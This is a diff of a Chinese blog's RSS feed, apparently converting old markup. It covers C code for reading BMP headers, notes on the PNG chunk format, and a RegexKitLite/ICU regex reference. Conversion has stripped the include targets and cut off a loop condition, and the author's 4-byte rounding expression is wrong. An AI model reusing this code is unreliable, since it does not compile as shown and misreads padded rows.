+详见&lt;a href=&quot;http://zh.wikipedia.org/zh/BMP#.E8.B0.83.E8.89.B2.E6.9D.BF&quot;&gt;&lt;a href=&quot;http://zh.wikipedia.org/zh/BMP#.E8.B0.83.E8.89.B2.E6.9D.BF&quot;&gt;http://zh.wikipedia.org/zh/BMP#.E8.B0.83.E8.89.B2.E6.9D.BF&lt;/a&gt;&lt;/a&gt;
+我用了以下的三个结构体用来接bmp头 然后再一个来接像素数据&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;//
 //  BmpLab.h
 //  labfor12c
 //
 //  Created by zxz on 12-11-28.
 //  Copyright (c) 2012年 zxz. All rights reserved.
-//&lt;/pre&gt;&lt;/p&gt;
+//
 
-&lt;p&gt;#ifndef labfor12c___BmpLab_h&lt;br /&gt;
-#define labfor12c___BmpLab_h&lt;/p&gt;
+#ifndef labfor12c___BmpLab_h
+#define labfor12c___BmpLab_h
 
-&lt;p&gt;typedef struct __BitMapHead{&lt;br /&gt;
-//    __uint16_t fileType;  //default BM&lt;br /&gt;
-    __uint32_t fileSize;&lt;br /&gt;
-    __uint32_t unDefined; //undefined&lt;br /&gt;
-    __uint32_t fileOffset;&lt;br /&gt;
-}BitMapHead;&lt;/p&gt;
+typedef struct __BitMapHead{
+//    __uint16_t fileType;  //default BM
+    __uint32_t fileSize;
+    __uint32_t unDefined; //undefined
+    __uint32_t fileOffset;
+}BitMapHead;
 
-&lt;p&gt;typedef struct __BitMapInfo{&lt;br /&gt;
-    __uint32_t infoHeadSize; //40&lt;br /&gt;
-    __uint32_t bitMapWidth;&lt;br /&gt;
-    __uint32_t bitMapHeight;&lt;br /&gt;
-    __uint16_t bitMapColorPlanes; //彩色位面的个数（不懂&lt;br /&gt;
-    __uint16_t bitMapPixelBit; //1 4 8 灰阶 24彩&lt;br /&gt;
-    __uint32_t bitMapCompression; //0 - 没有压缩（也用BI_RGB表示）    1 - 行程长度编码 8位/像素（也用BI_RLE8表示）    2 - 行程长度编码4位/像素（也用BI_RLE4表示）    3 - Bit field（也用BI_BITFIELDS表示）    4 - JPEG图像（也用BI_JPEG表示）    5 - PNG图像（也用BI_PNG表示）&lt;br /&gt;
-    __uint32_t bitMapBodySize;&lt;br /&gt;
-    __uint32_t bitMapXPixel;  //水平分辨率&lt;br /&gt;
-    __uint32_t bitMapYPixel;  //垂直分辨率&lt;br /&gt;
-    __uint32_t bitMapColorUsed;&lt;br /&gt;
-    __uint32_t bitMapImportantColorUsed;&lt;/p&gt;
+typedef struct __BitMapInfo{
+    __uint32_t infoHeadSize; //40
+    __uint32_t bitMapWidth;
+    __uint32_t bitMapHeight;
+    __uint16_t bitMapColorPlanes; //彩色位面的个数（不懂
+    __uint16_t bitMapPixelBit; //1 4 8 灰阶 24彩
+    __uint32_t bitMapCompression; //0 - 没有压缩（也用BI_RGB表示）    1 - 行程长度编码 8位/像素（也用BI_RLE8表示）    2 - 行程长度编码4位/像素（也用BI_RLE4表示）    3 - Bit field（也用BI_BITFIELDS表示）    4 - JPEG图像（也用BI_JPEG表示）    5 - PNG图像（也用BI_PNG表示）
+    __uint32_t bitMapBodySize;
+    __uint32_t bitMapXPixel;  //水平分辨率
+    __uint32_t bitMapYPixel;  //垂直分辨率
+    __uint32_t bitMapColorUsed;
+    __uint32_t bitMapImportantColorUsed;
 
-&lt;p&gt;}BitMapInfo;&lt;/p&gt;
+}BitMapInfo;
 
-&lt;p&gt;typedef struct __RGBQUARD{&lt;br /&gt;
-    __uint8_t rgbRed;&lt;br /&gt;
-    __uint8_t rgbGreen;&lt;br /&gt;
-    __uint8_t rgbBlue;&lt;br /&gt;
-    __uint8_t rgbReserved;&lt;br /&gt;
-}RGBQUARD;&lt;/p&gt;
+typedef struct __RGBQUARD{
+    __uint8_t rgbRed;
+    __uint8_t rgbGreen;
+    __uint8_t rgbBlue;
+    __uint8_t rgbReserved;
+}RGBQUARD;
 
-&lt;p&gt;typedef struct __pixelData&lt;br /&gt;
+typedef struct __pixelData
 {
-    __uint8_t blue;&lt;br /&gt;
-    __uint8_t green;&lt;br /&gt;
-    __uint8_t red;&lt;br /&gt;
-}pixelData;&lt;br /&gt;
-#endif&lt;/p&gt;
+    __uint8_t blue;
+    __uint8_t green;
+    __uint8_t red;
+}pixelData;
+#endif
 
-&lt;p&gt;再然后就是把文件rb打开分别用上面的结构体接就可以了&lt;br /&gt;
-其中要注意的下因为type是2个字节的、结构体是会补齐的也就是如果直接一起读进去后面都会乱的&lt;br /&gt;
+再然后就是把文件rb打开分别用上面的结构体接就可以了
+其中要注意的下因为type是2个字节的、结构体是会补齐的也就是如果直接一起读进去后面都会乱的
 所以我把type从结构体里注释了、选择先读进2个字节、然后再一并读进去
-&lt;pre lang=&quot;c&quot; colla=&quot;-&quot;&gt;
+
 //
 //  main.c
 //  labfor12c
 //
 //  Created by zxz on 12-11-26.
 //  Copyright (c) 2012年 zxz. All rights reserved.
-//&lt;/pre&gt;&lt;/p&gt;
+//
 
-&lt;p&gt;#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &quot;BmpLab.h&quot;&lt;/stdlib.h&gt;&lt;/stdio.h&gt;&lt;/p&gt;
+#include 
+#include 
+#include &amp;quot;BmpLab.h&amp;quot;
 
-&lt;p&gt;BitMapHead head;&lt;br /&gt;
-BitMapInfo info;&lt;br /&gt;
-RGBQUARD color[256];&lt;br /&gt;
-int main(int argc, const char * argv[])&lt;br /&gt;
-{&lt;/p&gt;
+BitMapHead head;
+BitMapInfo info;
+RGBQUARD color[256];
+int main(int argc, const char * argv[])
+{
 
-&lt;p&gt;    FILE *fpr,*fpw;&lt;br /&gt;
-    fpr=fopen(&quot;test_binaryImg.bmp&quot;, &quot;rb&quot;);&lt;br /&gt;
-    if (!fpr) {&lt;br /&gt;
-        printf(&quot;open fail&quot;);&lt;br /&gt;
-    }&lt;br /&gt;
-    else&lt;br /&gt;
-    {&lt;br /&gt;
-        __uint16_t type;&lt;br /&gt;
-        fread(&amp;type, 1, sizeof(__uint16_t), fpr);&lt;br /&gt;
-        if (type!=0x4d42) {&lt;br /&gt;
-            printf(&quot;not a bmp file&quot;);&lt;br /&gt;
-            return 1;&lt;br /&gt;
-        }&lt;br /&gt;
-        fread(&amp;head, 1, sizeof(BitMapHead), fpr);&lt;br /&gt;
-        fread(&amp;info, 1, sizeof(BitMapInfo), fpr);&lt;br /&gt;
-        unsigned int nCounti=0;&lt;br /&gt;
-        for(nCounti=0;nCounti&lt;info.bitMapColorUsed;nCounti++)&lt;br /&gt;
-        {&lt;br /&gt;
-            fread((char *)&amp;(color[nCounti].rgbBlue),1,sizeof(__uint8_t),fpr);&lt;br /&gt;
-            fread((char *)&amp;(color[nCounti].rgbGreen),1,sizeof(__uint8_t),fpr);&lt;br /&gt;
-            fread((char *)&amp;(color[nCounti].rgbRed),1,sizeof(__uint8_t),fpr);&lt;br /&gt;
-            fread((char *)&amp;(color[nCounti].rgbReserved),1,sizeof(__uint8_t),fpr);&lt;br /&gt;
-        }&lt;br /&gt;
-    }&lt;br /&gt;
-    __uint8_t *imgdata=(__uint8_t*)malloc(info.bitMapWidth*((sizeof(pixelData)+3)&amp;~4)*info.bitMapHeight); //向4取整（早上学完装逼的方法马上来用……&lt;br /&gt;
-    fread(imgdata, sizeof(pixelData)*info.bitMapWidth, info.bitMapHeight, fpr);&lt;br /&gt;
-    //deal with the preix&lt;br /&gt;
-    return 0;&lt;br /&gt;
-}&lt;/p&gt;
+    FILE *fpr,*fpw;
+    fpr=fopen(&amp;quot;test_binaryImg.bmp&amp;quot;, &amp;quot;rb&amp;quot;);
+    if (!fpr) {
+        printf(&amp;quot;open fail&amp;quot;);
+    }
+    else
+    {
+        __uint16_t type;
+        fread(&amp;amp;type, 1, sizeof(__uint16_t), fpr);
+        if (type!=0x4d42) {
+            printf(&amp;quot;not a bmp file&amp;quot;);
+            return 1;
+        }
+        fread(&amp;amp;head, 1, sizeof(BitMapHead), fpr);
+        fread(&amp;amp;info, 1, sizeof(BitMapInfo), fpr);
+        unsigned int nCounti=0;
+        for(nCounti=0;nCounti
+        {
+            fread((char *)&amp;amp;(color[nCounti].rgbBlue),1,sizeof(__uint8_t),fpr);
+            fread((char *)&amp;amp;(color[nCounti].rgbGreen),1,sizeof(__uint8_t),fpr);
+            fread((char *)&amp;amp;(color[nCounti].rgbRed),1,sizeof(__uint8_t),fpr);
+            fread((char *)&amp;amp;(color[nCounti].rgbReserved),1,sizeof(__uint8_t),fpr);
+        }
+    }
+    __uint8_t *imgdata=(__uint8_t*)malloc(info.bitMapWidth*((sizeof(pixelData)+3)&amp;amp;~4)*info.bitMapHeight); //向4取整（早上学完装逼的方法马上来用……
+    fread(imgdata, sizeof(pixelData)*info.bitMapWidth, info.bitMapHeight, fpr);
+    //deal with the preix
+    return 0;
+}
 
-&lt;p&gt;
-往回保存的时候修改下头里面的数据然后往回写即可&lt;/p&gt;
 
-&lt;p&gt;接着是png和jpeg、开始我 以为的是他们和位图一样简单呢……我还是太年轻了……&lt;br /&gt;
-还是先看下png的头吧&lt;br /&gt;
-png的头首先是一个8个字节的标示&lt;br /&gt;
-89 50 4E 47 0D 0A 1A 0A&lt;br /&gt;
-接下去是4个标准数据块&lt;br /&gt;
-分别是文件头数据块IHDR(header chunk)：包含有图像基本信息，作为第一个数据块出现并只出现一次。&lt;br /&gt;
-调色板数据块PLTE(palette chunk)：必须放在图像数据块之前。&lt;br /&gt;
-图像数据块IDAT(image data chunk)：存储实际图像数据。PNG数据允许包含多个连续的图像数据块。&lt;br /&gt;
-图像结束数据IEND(image trailer chunk)：放在文件尾部，表示PNG数据流结束。&lt;/p&gt;
+往回保存的时候修改下头里面的数据然后往回写即可
 
-&lt;p&gt;其中的每个数据块的结构是&lt;br /&gt;
-Length(长度)	4字节	 指定数据块中数据域的长度，其长度不超过(231－1)字节&lt;br /&gt;
-Chunk Type Code(数据块类型码)	4字节	 数据块类型码由ASCII字母(A-Z和a-z)组成&lt;br /&gt;
-Chunk Data(数据块数据)	可变长度	 存储按照Chunk Type Code指定的数据&lt;br /&gt;
-CRC(循环冗余检测)	4字节	 存储用来检测是否有错误的循环冗余码&lt;/p&gt;
+接着是png和jpeg、开始我 以为的是他们和位图一样简单呢……我还是太年轻了……
+还是先看下png的头吧
+png的头首先是一个8个字节的标示
+89 50 4E 47 0D 0A 1A 0A
+接下去是4个标准数据块
+分别是文件头数据块IHDR(header chunk)：包含有图像基本信息，作为第一个数据块出现并只出现一次。
+调色板数据块PLTE(palette chunk)：必须放在图像数据块之前。
+图像数据块IDAT(image data chunk)：存储实际图像数据。PNG数据允许包含多个连续的图像数据块。
+图像结束数据IEND(image trailer chunk)：放在文件尾部，表示PNG数据流结束。
 
-&lt;p&gt;每块数据块的具体详见&lt;a href=&quot;http://dev.gameres.com/Program/Visual/Other/PNGFormat.htm&quot;&gt;http://dev.gameres.com/Program/Visual/Other/PNGFormat.htm&lt;/a&gt;
-又是CRC什么的一搞就没兴趣去写代码解析了……&lt;br /&gt;
+其中的每个数据块的结构是
+Length(长度)  4字节  指定数据块中数据域的长度，其长度不超过(231－1)字节
+Chunk Type Code(数据块类型码) 4字节  数据块类型码由ASCII字母(A-Z和a-z)组成
+Chunk Data(数据块数据) 可变长度     存储按照Chunk Type Code指定的数据
+CRC(循环冗余检测) 4字节  存储用来检测是否有错误的循环冗余码
+
+每块数据块的具体详见http://dev.gameres.com/Program/Visual/Other/PNGFormat.htm
+又是CRC什么的一搞就没兴趣去写代码解析了……
 原来png jpeg这种头格式上半毛钱都关系不上啊……
-&lt;/p&gt;
-</description>
+
+&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
                 <link>http://snorlaxzxz.com/program/2012/11/28/bmp%E3%80%81png%E5%88%9D%E7%90%86%E8%A7%A3</link>
                 <guid>http://snorlaxzxz.com/program/2012/11/28/bmp、png初理解</guid>
                 <pubDate>2012-11-28T00:00:00+08:00</pubDate>
@@ -1742,349 +1722,350 @@ CRC(循环冗余检测)	4字节	 存储用来检测是否有错误的循环冗�
 
 &lt;p&gt;匹配范围的有多个函数举个最长的做例子&lt;/p&gt;
 
-&lt;p&gt;&amp;nbsp;
-&lt;pre lang=&quot;objective-c&quot;&gt;- (NSRange)RKL_METHOD_PREPEND(rangeOfRegex):(NSString *)regex options:(RKLRegexOptions)options inRange:(NSRange)range capture:(NSInteger)capture error:(NSError **)error;&lt;/pre&gt;
-&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;- (NSRange)RKL_METHOD_PREPEND(rangeOfRegex):(NSString *)regex options:(RKLRegexOptions)options inRange:(NSRange)range capture:(NSInteger)capture error:(NSError **)error;
+&amp;amp;nbsp;
 
-&lt;p&gt;别的根据名字也都可判断了、其中要注意点的就是 capture 这个参数是返回的匹配成功的第几个、他的匹配的模式是贪心的模式&lt;/p&gt;
+别的根据名字也都可判断了、其中要注意点的就是 capture 这个参数是返回的匹配成功的第几个、他的匹配的模式是贪心的模式
 
-&lt;p&gt;与之类似的判断匹配的返回的是匹配出的串
-&lt;pre lang=&quot;objective-c&quot;&gt;- (NSString *)RKL_METHOD_PREPEND(stringByMatching):(NSString *)regex capture:(NSInteger)capture&lt;/pre&gt;&lt;/p&gt;
+与之类似的判断匹配的返回的是匹配出的串
+- (NSString *)RKL_METHOD_PREPEND(stringByMatching):(NSString *)regex capture:(NSInteger)capture
 
-&lt;p&gt;- (NSString *)RKL_METHOD_PREPEND(stringByMatching):(NSString *)regex options:(RKLRegexOptions)options inRange:(NSRange)
+- (NSString *)RKL_METHOD_PREPEND(stringByMatching):(NSString *)regex options:(RKLRegexOptions)options inRange:(NSRange)
 2.寻找和替换
-&lt;pre lang=&quot;objective-c&quot;&gt;NSString *searchString = @&quot;This is neat.&quot;;&lt;/pre&gt;&lt;/p&gt;
+NSString *searchString = @&amp;quot;This is neat.&amp;quot;;
 
-&lt;p&gt;NSString *regexString = @&quot;\\b(\\w+)\\b&quot;;&lt;/p&gt;
+NSString *regexString = @&amp;quot;\\b(\\w+)\\b&amp;quot;;
 
-&lt;p&gt;NSString *replaceWithString = @&quot;{$1}&quot;;&lt;/p&gt;
+NSString *replaceWithString = @&amp;quot;{$1}&amp;quot;;
 
-&lt;p&gt;NSString *replacedString = NULL;&lt;/p&gt;
+NSString *replacedString = NULL;
 
-&lt;p&gt;replacedString = [searchString stringByReplacingOccurrencesOfRegex:regexString withString:replaceWithString];
-注意这里的替换的replaceWithString如果有$符、他会理解成对之前匹配出的串的附加如以上例子匹配完之后就是 {This} {is} {neat}.&lt;/p&gt;
+replacedString = [searchString stringByReplacingOccurrencesOfRegex:regexString withString:replaceWithString];
+注意这里的替换的replaceWithString如果有$符、他会理解成对之前匹配出的串的附加如以上例子匹配完之后就是 {This} {is} {neat}.
 
-&lt;p&gt;如果需要更复杂的运算可以使用block
-&lt;pre lang=&quot;objective-c&quot;&gt;replacedString =[searchString stringByReplacingOccurrencesOfRegex:regexString usingBlock:^NSString *(NSInteger captureCount, NSString * const capturedStrings[captureCount], const NSRange capturedRanges[captureCount], volatile BOOL * const stop){return ([NSString stringWithFormat:@&quot;%@&quot;,[capturedStrings[1] capitalizedString]]);}];&lt;/pre&gt;
+如果需要更复杂的运算可以使用block
+replacedString =[searchString stringByReplacingOccurrencesOfRegex:regexString usingBlock:^NSString *(NSInteger captureCount, NSString * const capturedStrings[captureCount], const NSRange capturedRanges[captureCount], volatile BOOL * const stop){return ([NSString stringWithFormat:@&amp;quot;%@&amp;quot;,[capturedStrings[1] capitalizedString]]);}];
 3.对每个匹配模式的形成array、切割成array
-&lt;pre lang=&quot;objective-c&quot;&gt;- (NSArray *)RKL_METHOD_PREPEND(componentsMatchedByRegex):(NSString *)regex options:(RKLRegexOptions)options range:(NSRange)range capture:(NSInteger)capture error:(NSError **)error&lt;/pre&gt;&lt;/p&gt;
+- (NSArray *)RKL_METHOD_PREPEND(componentsMatchedByRegex):(NSString *)regex options:(RKLRegexOptions)options range:(NSRange)range capture:(NSInteger)capture error:(NSError **)error
 
-&lt;p&gt;- (NSArray *)RKL_METHOD_PREPEND(componentsSeparatedByRegex):(NSString *)regex options:(RKLRegexOptions)options range:(NSRange)range error:(NSError **)error
-基本的操作就如上、每块分别还有不同的接口、基本命名规范都大同小异、复杂的就使用block&lt;/p&gt;
+- (NSArray *)RKL_METHOD_PREPEND(componentsSeparatedByRegex):(NSString *)regex options:(RKLRegexOptions)options range:(NSRange)range error:(NSError **)error
+基本的操作就如上、每块分别还有不同的接口、基本命名规范都大同小异、复杂的就使用block
 
-&lt;p&gt;其中的 RKLRegexIptions 是一个如下的结构
-&lt;pre lang=&quot;objective-c&quot;&gt;enum {&lt;/pre&gt;&lt;/p&gt;
+其中的 RKLRegexIptions 是一个如下的结构
+enum {
 
-&lt;p&gt;RKLNoOptions             = 0,   //无特殊意义&lt;/p&gt;
+RKLNoOptions             = 0,   //无特殊意义
 
-&lt;p&gt;RKLCaseless              = 2,    //不敏感大小写模式&lt;/p&gt;
+RKLCaseless              = 2,    //不敏感大小写模式
 
-&lt;p&gt;RKLComments              = 4,//允许在模式中使用空格&lt;/p&gt;
+RKLComments              = 4,//允许在模式中使用空格
 
-&lt;p&gt;RKLDotAll                = 32, //使用行读取模式&lt;/p&gt;
+RKLDotAll                = 32, //使用行读取模式
 
-&lt;p&gt;RKLMultiline             = 8, //^和$也会匹配每行&lt;/p&gt;
+RKLMultiline             = 8, //^和$也会匹配每行
 
-&lt;p&gt;RKLUnicodeWordBoundaries = 256 //Controls the behavior of \b in a pattern. If set, word boundaries are found according to the definitions of word found in &lt;a href=&quot;http://www.unicode.org/reports/tr29/&quot;&gt;Unicode UAX 29 - Text Boundaries&lt;/a&gt;. By default, word boundaries are identified by means of a simple classification of characters as either word or non-word, which approximates traditional regular expression behavior. The results obtained with the two options can be quite different in runs of spacesand other non-word characters.&lt;/p&gt;
+RKLUnicodeWordBoundaries = 256 //Controls the behavior of \b in a pattern. If set, word boundaries are found according to the definitions of word found in Unicode UAX 29 - Text Boundaries. By default, word boundaries are identified by means of a simple classification of characters as either word or non-word, which approximates traditional regular expression behavior. The results obtained with the two options can be quite different in runs of spacesand other non-word characters.
 
-&lt;p&gt;};
+};
 然后附上ICU的正则标准
-&lt;div&gt;
-&lt;div&gt;
-&lt;div&gt;
-&lt;table summary=&quot;Regular Expression Metacharacters&quot;&gt;&lt;caption&gt;Metacharacters&lt;/caption&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;th&gt;Character&lt;/th&gt;
-&lt;th&gt;Description&lt;/th&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;\a&lt;/td&gt;
-&lt;td&gt;Match a BELL, \u0007&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;\A&lt;/td&gt;
-&lt;td&gt;Match at the beginning of the input. Differs from ^ in that \A will not match after a new-line within the input.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;\b, outside of a [&lt;em&gt;Set&lt;/em&gt;]&lt;/td&gt;
-&lt;td&gt;Match if the current position is a word boundary. Boundaries occur at the transitions between word \w and non-word \W characters, with combining marks ignored.
-&lt;div&gt;&lt;strong&gt;See also:&lt;/strong&gt; &lt;a href=&quot;http://regexkit.sourceforge.net/RegexKitLite/#RKLRegexOptions_RKLUnicodeWordBoundaries&quot;&gt;RKLUnicodeWordBoundaries&lt;/a&gt;&lt;/div&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;\b, within a [&lt;em&gt;Set&lt;/em&gt;]&lt;/td&gt;
-&lt;td&gt;Match a BACKSPACE, \u0008.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;\B&lt;/td&gt;
-&lt;td&gt;Match if the current position is not a word boundary.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;\c&lt;em&gt;x&lt;/em&gt;&lt;/td&gt;
-&lt;td&gt;Match a &lt;em title=&quot;Control Character x, i.e. ^C&quot;&gt;Control-x&lt;/em&gt; character.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;\d&lt;/td&gt;
-&lt;td&gt;Match any character with the &lt;em&gt;Unicode General Category&lt;/em&gt; of Nd(&lt;em&gt;Number&lt;/em&gt;, &lt;em&gt;Decimal Digit&lt;/em&gt;).&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;\D&lt;/td&gt;
-&lt;td&gt;Match any character that is not a decimal digit.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;\e&lt;/td&gt;
-&lt;td&gt;Match an ESCAPE, \u001B.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;\E&lt;/td&gt;
-&lt;td&gt;Terminates a \Q…\E quoted sequence.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;\f&lt;/td&gt;
-&lt;td&gt;Match a FORM FEED, \u000C.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;\G&lt;/td&gt;
-&lt;td&gt;Match if the current position is at the end of the previous match.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;\n&lt;/td&gt;
-&lt;td&gt;Match a LINE FEED, \u000A.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;\N{&lt;em&gt;Unicode Character Name&lt;/em&gt;}&lt;/td&gt;
-&lt;td&gt;Match the named &lt;em&gt;Unicode Character&lt;/em&gt;.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;\p{&lt;em&gt;Unicode Property Name&lt;/em&gt;}&lt;/td&gt;
-&lt;td&gt;Match any character with the specified &lt;em&gt;Unicode Property&lt;/em&gt;.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;\P{&lt;em&gt;Unicode Property Name&lt;/em&gt;}&lt;/td&gt;
-&lt;td&gt;Match any character not having the specified &lt;em&gt;Unicode Property&lt;/em&gt;.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;\Q&lt;/td&gt;
-&lt;td&gt;Quotes all following characters until \E.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;\r&lt;/td&gt;
-&lt;td&gt;Match a CARRIAGE RETURN, \u000D.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td id=&quot;ICUSyntax_ICURegularExpressionSyntax_white_space&quot;&gt;\s&lt;/td&gt;
-&lt;td&gt;Match a white space character. White space is defined as[\t\n\f\r\p{Z}].&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;\S&lt;/td&gt;
-&lt;td&gt;Match a non-white space character.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;\t&lt;/td&gt;
-&lt;td&gt;Match a HORIZONTAL TABULATION, \u0009.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;\u&lt;em&gt;hhhh&lt;/em&gt;&lt;/td&gt;
-&lt;td&gt;Match the character with the hex value &lt;em title=&quot;Hexidecimal Number&quot;&gt;hhhh&lt;/em&gt;.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;\U&lt;em title=&quot;Hexidecimal Number&quot;&gt;hhhhhhhh&lt;/em&gt;&lt;/td&gt;
-&lt;td&gt;Match the character with the hex value &lt;em title=&quot;Hexidecimal Number&quot;&gt;hhhhhhhh&lt;/em&gt;. Exactly eight hex digits must be provided, even though the largest Unicode code point is \U0010ffff.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;\w&lt;/td&gt;
-&lt;td&gt;Match a word character. Word characters are[\p{Ll}\p{Lu}\p{Lt}\p{Lo}\p{Nd}].&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;\W&lt;/td&gt;
-&lt;td&gt;Match a non-word character.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;\x{&lt;em title=&quot;Hexidecimal Number&quot;&gt;h&lt;/em&gt;…}&lt;/td&gt;
-&lt;td&gt;Match the character with hex value &lt;em title=&quot;Hexidecimal Number&quot;&gt;hhhh&lt;/em&gt;. From one to six hex digits may be supplied.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;\x&lt;em title=&quot;Hexidecimal Number&quot;&gt;hh&lt;/em&gt;&lt;/td&gt;
-&lt;td&gt;Match the character with two digit hex value &lt;em title=&quot;Hexidecimal Number&quot;&gt;hh&lt;/em&gt;.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;\X&lt;/td&gt;
-&lt;td&gt;Match a &lt;a href=&quot;http://www.unicode.org/reports/tr29/#Grapheme_Cluster_Boundaries&quot;&gt;Grapheme Cluster&lt;/a&gt;.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;\Z&lt;/td&gt;
-&lt;td&gt;Match if the current position is at the end of input, but before the final line terminator, if one exists.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;\z&lt;/td&gt;
-&lt;td&gt;Match if the current position is at the end of input.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;\&lt;em title=&quot;Decimal Number&quot;&gt;n&lt;/em&gt;&lt;/td&gt;
-&lt;td&gt;
-&lt;div&gt;Back Reference. Match whatever the &lt;em title=&quot;Decimal Number&quot;&gt;n&lt;/em&gt;th capturing group matched. &lt;em title=&quot;Decimal Number&quot;&gt;n&lt;/em&gt;must be a number ≥ 1 and ≤ total number of capture groups in the pattern.&lt;/div&gt;
-&lt;div&gt;
-&lt;div&gt;
-&lt;div&gt;
-&lt;div&gt;Note:&lt;/div&gt;
-&lt;div&gt;Octal escapes, such as \012, are not supported.&lt;/div&gt;
-&lt;/div&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;[&lt;em&gt;pattern&lt;/em&gt;]&lt;/td&gt;
-&lt;td&gt;Match any one character from the set. See &lt;a href=&quot;http://regexkit.sourceforge.net/RegexKitLite/#ICUSyntax_ICURegularExpressionCharacterClasses&quot;&gt;ICU Regular Expression Character Classes&lt;/a&gt; for a full description of what may appear in the pattern.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;.&lt;/td&gt;
-&lt;td&gt;Match any character.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;^&lt;/td&gt;
-&lt;td&gt;Match at the beginning of a line.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;$&lt;/td&gt;
-&lt;td&gt;Match at the end of a line.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;\&lt;/td&gt;
-&lt;td&gt;Quotes the following character. Characters that must be quoted to be treated as literals are * ? + [ ( ) { } ^ $ | \ . /&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;/div&gt;
-&lt;div&gt;
-&lt;table id=&quot;ICUSyntax_Operators&quot; summary=&quot;Regular Expression Operators&quot;&gt;&lt;caption&gt;Operators&lt;/caption&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;th&gt;Operator&lt;/th&gt;
-&lt;th&gt;Description&lt;/th&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;|&lt;/td&gt;
-&lt;td&gt;Alternation. A|B matches either A or B.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;*&lt;/td&gt;
-&lt;td&gt;Match zero or more times. Match as many times as possible.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;+&lt;/td&gt;
-&lt;td&gt;Match one or more times. Match as many times as possible.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;?&lt;/td&gt;
-&lt;td&gt;Match zero or one times. Prefer one.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;{&lt;em title=&quot;Decimal Number&quot;&gt;n&lt;/em&gt;}&lt;/td&gt;
-&lt;td&gt;Match exactly &lt;em title=&quot;Decimal Number&quot;&gt;n&lt;/em&gt; times.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;{&lt;em title=&quot;Decimal Number&quot;&gt;n&lt;/em&gt;,}&lt;/td&gt;
-&lt;td&gt;Match at least &lt;em title=&quot;Decimal Number&quot;&gt;n&lt;/em&gt; times. Match as many times as possible.&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;{&lt;em title=&quot;Decimal Number&quot;&gt;n&lt;/em&gt;,&lt;em title=&quot;Decimal Number&quot;&gt;m&lt;/em&gt;}&lt;/td&gt;
